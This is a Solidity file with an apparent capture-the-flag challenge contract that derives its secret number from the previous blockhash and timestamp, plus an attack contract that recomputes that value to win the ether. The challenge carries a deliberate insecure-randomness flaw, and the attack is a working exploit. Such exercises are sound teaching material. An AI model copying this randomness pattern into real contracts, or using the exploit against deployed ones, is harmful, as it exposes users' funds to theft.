// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    constructor() payable {
        require(msg.value == 1 ether);
        answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}

contract GuessRandomNumberAttack {
  constructor() payable {
    require(msg.value == 1 ether);
  }

  function attack (address payable vulnContractAddr) external {
    GuessTheRandomNumberChallenge vulnContract = GuessTheRandomNumberChallenge(vulnContractAddr);

    // common tactic to bypass hard-coded checks: copy the contract's
    // checking code & simply re-calculate the result within the attack contract
    uint8 solution = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

    // now we can supply it & complete the challenge.
    vulnContract.guess{value: 1 ether}(solution);
  }

  receive() external payable {}
  fallback() external payable {}
}